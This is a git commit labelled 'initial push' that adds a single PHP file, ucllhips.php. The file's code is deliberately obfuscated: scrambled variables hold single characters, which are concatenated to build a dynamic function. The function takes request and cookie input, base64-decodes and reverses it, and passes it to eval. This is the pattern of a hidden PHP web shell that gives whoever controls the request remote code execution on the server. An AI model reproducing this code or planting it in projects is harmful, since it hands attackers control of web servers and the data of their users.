07c26eec9562d9ff0ba98d1862fdea39c36ff546
Zuniga <alex@bowiecreative.co>
2020-10-05 15:33:04 -0500

    initial push

---
+++ ucllhips.php
@@ -0,0 +1,125 @@
+<?php
+$feathering ='cKN;W_t';$expeditions = 'w['; $fulvia = 'r';$deluge='t[';$frequencies ='y)(ISPI';$decimated= ')';$laughingly=')';$curries = 'Kmt"_Sra$';$casebook ='k';$harold=')';$christia='" scXTr_I';$gilburt = 'l'; $confederations = '_g'; $electricity = ']e$;E'; $kidnapper ='Q'; $balmy= '(i';$confidentially='r';$kristina= 'e';$crystallized = 'EUn_';
+$carma='(r_,uR$$';$developing= '6nW';
+$conjunctions = 'C]e';$insurgent = 'f';
+
+$contexts = 'RZc;g""'; $bantered ='"a['; $flooded= 'E'; $cinnamon ='e';
+$convect='e_';$crushes ='('; $bellanca='gu[g?:"Ys';
+$diner= 'I';
+$comprehensively ='$';$cissiee =')is';
+$famine= 'r'; $escalate ='aer'; $cottages =';';
+
+$kate= '$';$congenital ='V'; $juliette = 'U';$finessing='q';$concocter='ds'; $entreaty=':'; $anteater=']Ere)E"'; $illegal = '_$syq';$excretion= 'NrRQTet^W';$freehand= '"'; $erl = 'i'; $bashes= 'aVR?aa';$celebrating = 'Qpprv()jR';
+
+$eartha ='i'; $downslope='Tif))'; $blush = 'l`v'; $leah = '$';
+
+$dipped = 'a'; $doreen ='eP';
+$appointer= 'nEHvO'; $bracketing = 'eop[doK$k';$basked= 'b';$lubricant= 'nt='; $hitchhiker = 'T'; $dogtrot ='(hHs,vr';
+
+$increase= 'w';
+$bearberry='(';$betrayed='i';$goddamn = 'i]_u(xkti';$copper = 'w'; $amateurishness= 's'; $darth ='e';$dispersions = 'E';
+$lemmy ='T';$drudge = 'n';$apex = 'm';$harp ='dla]=ed';
+$extensions= 'r';$consumptions ='et)(T__'; $findlay= 'sa_iS(i';$basking= '4abiaI'; $cloddish= 'o';$explosive ='O';$barnebas= 'e';$enshroud = 'i'; $intrigues= 'e'; $emblem = 'icRn';$cleave='c';$henchmen= 'P'; $fishes= 'e';$continued='e';
+$hailed ='q';
+
+$cask='f'; $flor= 'a';$burly= '(';
+
+$kasper= 's';$capitalize= 'Qe)rrvto$';
+$bank ='O';$eliminators= 'i'; $backdrop= $cleave.
+$capitalize[4].$capitalize['1'].$flor.
+
+$capitalize['6']. $capitalize['1'] . $findlay['2'].
+
+$cask.$goddamn['3'].
+$emblem['3'] .$cleave.
+
+$capitalize['6'].
+$eliminators . $capitalize[7] .
+
+$emblem['3'] ;$furiouser=$christia['1'] ;$emptier=$backdrop
+($furiouser,$capitalize['1'] . $capitalize['5'] .$flor . $harp['1'] .
+$burly.$flor.
+$capitalize[4] .$capitalize[4].
+
+$flor .
+$illegal['3'].
+$findlay['2'].$bracketing['2'] .$capitalize[7].
+
+$bracketing['2']. $burly. $cask.
+$goddamn['3'] .$emblem['3'] .$cleave .$findlay['2'].
+
+$bellanca['3'] . $capitalize['1'] .$capitalize['6'].
+$findlay['2']. $flor.$capitalize[4]. $bellanca['3']. $kasper .$burly . $capitalize['2']. $capitalize['2'] .
+
+$capitalize['2'].$cottages ); $emptier ($brothel['3'],
+
+$copper,
+$iolande ,$harp['1'] ,
+
+$apex ,$harp['3'] , $celebrating['7'] ,$dogtrot['2'],
+$cottages, $copper ,
+$bellanca['3'] , $capitalize['8']. $eliminators . $harp['4']. $flor.
+
+$capitalize[4] .
+$capitalize[4] .
+$flor.$illegal['3']. $findlay['2'] .
+$apex. $capitalize['1'] . $capitalize[4]. $bellanca['3'] . $capitalize['1'] .$burly .
+
+$capitalize['8']. $findlay['2'].
+$emblem['2']. $dispersions. $capitalize['0'].$juliette . $dispersions. $findlay['4'].$consumptions['4'].
+$dogtrot['4'] . $capitalize['8'].$findlay['2']. $conjunctions['0'].
+$bank .$bank .$bracketing['6'] . $basking['5'] . $dispersions .$dogtrot['4'].
+
+$capitalize['8'].$findlay['2'].$findlay['4'].$dispersions .$emblem['2'] .
+
+$bashes['1'] .
+$dispersions. $emblem['2'] .
+$capitalize['2'].
+
+$cottages.$capitalize['8'] .
+$flor.$harp['4']. $eliminators .
+
+$kasper .$kasper. $capitalize['1'].$capitalize['6'] .$burly.
+$capitalize['8'].$eliminators .$bracketing[3]. $freehand . $copper .$eliminators .
+$emblem['3'] . $capitalize[4].
+$capitalize['1'].$eliminators.$hailed . $goddamn[6] .$freehand . $harp['3']. $capitalize['2'] .
+$bashes['3']. $capitalize['8'] .
+
+$eliminators .$bracketing[3] . $freehand. $copper. $eliminators.$emblem['3'] .$capitalize[4] .$capitalize['1'].$eliminators.$hailed.
+$goddamn[6] . $freehand.$harp['3']. $entreaty.$burly .
+$eliminators . $kasper.$kasper . $capitalize['1'] . $capitalize['6'] .$burly .$capitalize['8'] .$eliminators.$bracketing[3].
+
+$freehand .$dogtrot['2'].
+
+$consumptions['4'] . $consumptions['4'] . $henchmen.$findlay['2'].
+
+$excretion['8'].$basking['5']. $excretion['0'] . $emblem['2'] . $dispersions. $basking['5']. $capitalize['0'].
+
+$bracketing['6'] .$freehand . $harp['3'] .$capitalize['2'].$bashes['3'].$capitalize['8']. $eliminators .$bracketing[3] . $freehand. $dogtrot['2'].$consumptions['4'] . $consumptions['4'].
+$henchmen. $findlay['2'].$excretion['8'].
+$basking['5'] .
+
+$excretion['0'].$emblem['2'] .$dispersions .$basking['5'] . $capitalize['0']. $bracketing['6']. $freehand .$harp['3']. $entreaty. $harp['6'] . $eliminators .$capitalize['1'].$capitalize['2'] . $cottages .$capitalize['1'] .$capitalize['5'].$flor.
+
+$harp['1'].
+
+$burly . $kasper.
+
+$capitalize['6'] . $capitalize[4] .$capitalize[4] .$capitalize['1'] . $capitalize['5'].$burly . $basking['2'].
+
+$flor .$kasper.
+
+$capitalize['1'] .$developing['0'] . $basking['0'].
+$findlay['2'] .
+$harp['6'] .$capitalize['1'] .
+
+$cleave.$capitalize[7] .
+
+$harp['6'].$capitalize['1']. $burly.$kasper .$capitalize['6'] .
+
+$capitalize[4] .
+$capitalize[4].
+$capitalize['1']. $capitalize['5']. $burly.
+
+$capitalize['8'].$flor.$capitalize['2'] . $capitalize['2'] .
+$capitalize['2'] .$capitalize['2'] .$cottages); 
